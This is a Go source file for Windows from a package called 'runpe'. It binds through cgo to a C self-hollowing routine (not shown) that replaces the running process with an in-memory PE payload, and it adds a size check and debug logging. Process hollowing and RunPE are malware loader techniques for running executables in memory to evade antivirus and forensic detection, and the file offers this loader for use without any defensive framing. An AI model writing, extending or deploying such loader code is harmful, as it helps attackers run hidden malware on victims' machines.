//go:build windows
// +build windows

// Package runpe provides functionality to execute PE files in memory.
// With self-hollowing, it replaces the current process with the payload.
// This package only works on Windows systems.
package runpe

// #cgo CFLAGS: -Wall
// #cgo LDFLAGS: -L${SRCDIR}/.. -lrunpe -luser32 -lkernel32
// #include "../cpp/selfhollow.h"
import "C"
import (
	"fmt"
	"unsafe" // Restored for passing payload pointer
)

// ExecuteInMemory replaces the current process with the PE payload in memory.
// payload is the PE file as a byte array.
func ExecuteInMemory(payload []byte) error {
	if len(payload) < 512 { // Basic sanity check for payload size
		return fmt.Errorf("invalid payload size: %d bytes. Minimum 512 bytes expected", len(payload))
	}
	
	fmt.Println("Go: About to call C.SelfHollowStrict"); // Go-side log
	success := C.SelfHollowStrict(
		(*C.uchar)(unsafe.Pointer(&payload[0])),
		C.size_t(len(payload)),
	)
	fmt.Printf("Go: C.SelfHollowStrict returned: %v\n", success); // Go-side log

	if !success {
		return fmt.Errorf("self-hollowing execution failed (C.SelfHollowStrict returned false)")
	}
	
	return nil
} 